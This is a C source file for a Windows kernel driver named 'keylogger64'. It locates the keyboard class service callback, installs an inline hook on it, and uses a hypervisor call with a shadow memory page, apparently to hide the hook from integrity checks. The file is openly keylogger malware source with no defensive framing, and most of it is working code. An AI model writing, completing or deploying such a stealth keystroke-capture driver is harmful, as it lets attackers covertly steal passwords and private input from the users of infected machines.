//  [6/25/2015 uty]
#include <ntddk.h>
#include "keyboardclassservicecallback.h"
#include "amd64\vmx-asm.h"
//-----------------------------------------------------------------------------//
NTSTATUS
DriverEntry (
	__in PDRIVER_OBJECT DriverObject,
	__in PUNICODE_STRING RegistryPath
	)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PHYSICAL_ADDRESS OriginalPhysicalAddress = {0};
	PVOID pShadowPage = NULL;
	PHYSICAL_ADDRESS ShadowPhysicalPage = {0};

	PVOID KeyboardClassServiceCallBackAddress = NULL;

    UNICODE_STRING DeviceName = { 0 };
    PDEVICE_OBJECT DeviceObject = NULL;


    RtlInitUnicodeString(&DeviceName, L"\\Device\\keylogger64");
    Status = IoCreateDevice(DriverObject, 0, &DeviceName,
        FILE_DEVICE_UNKNOWN, 0, FALSE,
        &DeviceObject);
    if (STATUS_SUCCESS != Status)
    {
        DbgPrint("IoCreateDevice fail.\n");
        goto Exit0;
    }

	Status = SearchKeyboardClassServiceCallback(DriverObject);
	if (STATUS_SUCCESS != Status)
	{
		goto Exit0;
	}

	KeyboardClassServiceCallBackAddress = (PVOID)g_KbdCallBack.serviceCallBack;

	DbgPrint("KeyboardClassServiceCallBack first 4 bytes %x\n", *(PULONG)KeyboardClassServiceCallBackAddress);

	OriginalPhysicalAddress = MmGetPhysicalAddress(KeyboardClassServiceCallBackAddress);
	pShadowPage = MmAllocateNonCachedMemory(PAGE_SIZE);
	memcpy(pShadowPage, PAGE_ALIGN(KeyboardClassServiceCallBackAddress), PAGE_SIZE);

	ShadowPhysicalPage = MmGetPhysicalAddress(pShadowPage);
	DbgPrint("Shadow Physical page 0x%x\n", ShadowPhysicalPage.LowPart);

	InlineHookKeyboardClassServiceCallback(KeyboardClassServiceCallBackAddress, KeyboardClassServiceCallbackHook);
	DbgPrint("KeyboardClassServiceCallBack first 4 bytes %x\n", *(PULONG)KeyboardClassServiceCallBackAddress);

	// init
	VmxVmCall2(0x28, OriginalPhysicalAddress.QuadPart, ShadowPhysicalPage.QuadPart);

	DbgPrint("KeyboardClassServiceCallBack first 4 bytes %x\n", *(PULONG)KeyboardClassServiceCallBackAddress);

	Status = STATUS_SUCCESS;
Exit0:
	return Status;
}
//-----------------------------------------------------------------------------//